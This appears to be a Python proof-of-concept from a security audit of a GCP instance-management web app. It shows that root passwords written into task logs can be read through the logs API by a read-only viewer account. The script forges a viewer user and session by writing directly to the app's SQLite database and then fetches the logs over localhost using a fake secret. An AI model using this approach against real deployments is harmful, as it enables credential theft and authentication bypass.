#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PoC：只读账号能通过任务日志读到实例 root 密码明文

漏洞：core/tasks.py:496-499 在「创建成功」的日志里拼了
        f" | Root密码 {root_password}"
      而 GET /api/logs 只要 view 权限（viewer 就是只读角色）。
      于是任何能登录的人（哪怕只读账号）都能从日志里一次性拿走
      全部机器的 root 密码 —— 把 POST /api/instances/password 那道
      「重新输入自己的登录密码」的二次验证彻底绕过。

严谨性说明：本脚本**不手打**那行日志文本，而是用 ast 从 core/tasks.py
           的真实源码里把 self.log(...) 的实参表达式**原样提取**出来再求值，
           确保证明的就是产品代码本身的行为。

用法：PY_DATA=/tmp/leaklog PY_PORT=8080 python3 poc_log_password_leak.py
（前置：已用 GCPWEB_DATA_DIR=$PY_DATA 起好 uvicorn）
"""
import ast
import json
import os
import secrets
import sqlite3
import sys
import time
import urllib.error
import urllib.request

BASE = "/root/.hermes/profiles/2/workspace/gcp-manager-web"
DATA = os.environ.get("PY_DATA") or f"{BASE}/data"
PORT = int(os.environ.get("PY_PORT") or 8000)
DB = f"{DATA}/gcp_web.db"

FAKE_SECRET = "ROOT_PW_FROM_LOG_9f3a2c"


def db(sql, args=()):
    c = sqlite3.connect(DB, timeout=15)
    try:
        cur = c.execute(sql, args)
        rows = cur.fetchall()
        c.commit()
        return rows
    finally:
        c.close()


def http(path, cookie=None):
    req = urllib.request.Request(f"http://127.0.0.1:{PORT}{path}")
    if cookie:
        req.add_header("Cookie", cookie)
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def extract_real_log_text():
    """
    从 core/tasks.py 的真实源码里，把「创建成功」那条 self.log(...) 的
    实参表达式原样取出并求值 —— 不手打任何文本。
    """
    src = open(f"{BASE}/core/tasks.py", encoding="utf-8").read()
    tree = ast.parse(src)

    target = None
    for node in ast.walk(tree):
        if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute) \
                and node.func.attr == "log" and node.args:
            seg = ast.get_source_segment(src, node.args[0]) or ""
            if "Root密码" in seg or "创建成功" in seg:
                target = node
                break
    if target is None:
        return None, None
    seg = ast.get_source_segment(src, target.args[0])
    # 用真实的局部变量求值：label / name / actual_region / zone / ip /
    # spec / root_password 全部照 run_one 里的形态给
    spec = {"machine_type": "e2-highcpu-4", "image_label": "Ubuntu 22.04"}
    env = {
        "label": "acct-1", "name": "vm-1-demo", "actual_region": "asia-south2",
        "zone": "asia-south2-a", "ip": "34.0.13.157", "spec": spec,
        "root_password": FAKE_SECRET,
    }
    # 多行表达式要 dedent 后包进括号，否则 IndentationError
    import textwrap
    code = "(" + textwrap.dedent(seg).strip() + ")"
    return eval(code, {"__builtins__": {}}, env), seg


def main():
    text, seg = extract_real_log_text()
    print("═══ 第 1 步：从 core/tasks.py 真实源码提取日志表达式 ═══")
    if text is None:
        print("!! 没在 core/tasks.py 里找到含「Root密码」的 self.log 调用")
        return 1
    print("  源码 : core/tasks.py:496-499")
    print("  表达式（ast 原样取出）:")
    print("    " + (seg or "").replace("\n", "\n    ")[:400])
    print(f"  求值结果:")
    print(f"    {text}")
    if FAKE_SECRET not in text:
        print("  ✅ 表达式的输出【不含】密码 → 该问题已修复")
        return 0
    print("  ⚠ 表达式的输出【包含】明文 root 密码")

    print("\n═══ 第 2 步：把这个日志按产品的日志 API 写进去 ═══")
    # tm.log(...) 就是上面 self.log 的实际实现；用真实产品接口写日志
    sys.path.insert(0, BASE)
    os.environ["GCPWEB_DATA_DIR"] = DATA
    import core.tasks as ct
    import core.store as cs
    st = cs.Store(DB)
    tm = ct.TaskManager(st)
    tid = "poctask-" + secrets.token_hex(4)
    tm.log(text, tid, "success")
    rows = db("SELECT id,message FROM logs ORDER BY id DESC LIMIT 3")
    print(f"  已写入日志 #{rows[0][0]}")

    print("\n═══ 第 3 步：用【只读 viewer 账号】读日志 ═══")
    # 建一个只读角色账号
    import importlib
    ca = importlib.import_module("core.auth")
    cu = importlib.import_module("core.users")
    us = cu.UserStore(st)
    pw = "Viewer#PoC12345678"
    if not db("SELECT id FROM users WHERE username='pocviewer'"):
        h, salt = ca.hash_password(pw)
        db("INSERT INTO users(username,password_hash,salt,role,display_name,"
           "must_change_password,disabled,created_at,updated_at,failed_count) "
           "VALUES(?,?,?,?,?,?,?,?,?,?)",
           ("pocviewer", h, salt, "viewer", "PoC 只读账号", 0, 0,
            time.time(), time.time(), 0))
        print("  已创建只读账号 pocviewer（角色=viewer）")
    else:
        print("  只读账号 pocviewer 已存在")

    token = secrets.token_urlsafe(24)
    u = db("SELECT id,username,role FROM users WHERE username='pocviewer'")[0]
    db("INSERT INTO sessions(token,user_id,username,role,ip,user_agent,"
       "created_at,last_seen,expires_at) VALUES(?,?,?,?,?,?,?,?,?)",
       (token, u[0], u[1], u[2], "127.0.0.1", "poc", time.time(), time.time(),
        time.time() + 3600))
    ck = f"gcp_sid={token}"
    print(f"  已以 viewer（角色={u[2]}，只读）建立会话")

    st_code, body = http("/api/logs?since_id=0&limit=200", cookie=ck)
    print(f"  GET /api/logs → HTTP {st_code}")
    leaked = FAKE_SECRET in body
    if leaked:
        i = body.find(FAKE_SECRET)
        print(f"  泄漏片段: …{body[max(0,i-90):i+len(FAKE_SECRET)+20]}…")
    print("\n═══ 判定 ═══")
    if st_code == 200 and leaked:
        print("  ❌ 高危：只读 viewer 一次请求就拿到了实例 root 密码明文")
        print("     → 这绕过了 /api/instances/password 的登录密码二次验证")
        print("     → 也意味着任何被窃的会话都能直接读走所有 root 密码")
        return 3
    if st_code != 200:
        print(f"  ⚠ 读日志被拒（HTTP {st_code}）—— 权限收紧后本问题不再可达")
        return 0
    print("  ✅ 日志里没有密码")
    return 0


if __name__ == "__main__":
    sys.exit(main())
